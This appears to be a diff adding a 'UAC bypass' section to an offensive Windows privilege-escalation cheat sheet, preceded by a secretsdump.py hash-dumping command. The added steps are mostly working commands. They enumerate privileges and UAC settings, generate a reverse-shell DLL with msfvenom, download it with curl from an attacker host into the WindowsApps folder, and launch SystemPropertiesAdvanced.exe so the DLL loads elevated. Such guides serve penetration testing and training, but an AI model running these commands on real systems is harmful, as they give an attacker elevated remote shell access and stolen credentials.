@@ -435,3 +435,90 @@ Once we Are member of Admin Group We can dump hashes of admin
 attacker@ubuntu[/]$  secretsdump.py <user>@<ip> -just-dc-user administrator
 ``` 
 
+## Attacking the OS
+
+### User Account Control
+
+User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run
+
+#### Confirming Admin Group Membership
+
+```
+C:\> net localgroup administrators
+```
+
+#### Reviewing User Privileges
+
+```
+C:\> whoami /priv
+```
+
+#### Confirming UAC is Enabled
+
+```
+C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
+```
+#### Checking UAC level
+
+```
+C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+```
+> The value of ConsentPromptBehaviorAdmin is 0x5, which means the highest UAC level of Always notify is enabled. There are fewer UAC bypasses at this highest level.
+
+#### Checking Windows Version
+
+UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.
+
+```
+PS C:\> [environment]::OSVersion.Version
+
+Major  Minor  Build  Revision
+-----  -----  -----  --------
+10     0      14393  0
+```
+This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page we cross-reference to Windows release 1607
+
+> The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it.
+
+#### Reviewing Path Variable
+
+```
+PS C:\> cmd /c echo %PATH%
+
+C:\Windows\system32;
+C:\Windows;
+C:\Windows\System32\Wbem;
+C:\Windows\System32\WindowsPowerShell\v1.0\;
+C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
+``` 
+We can potentially bypass UAC in this by using DLL hijacking by placing a malicious srrstr.dll DLL to WindowsApps folder, which will be loaded in an elevated context.
+
+#### Generating Malicious srrstr.dll DLL
+
+```
+Attacker@kali[/kali]$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip addr> LPORT=<port> -f dll > srrstr.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of dll file: 5120 bytes
+```
+
+#### Downloading DLL Target
+
+```
+PS C:\>curl http://<ip>/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+```
+
+#### Executing SystemPropertiesAdvanced.exe on Target Host
+
+```
+C:\> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+``` 
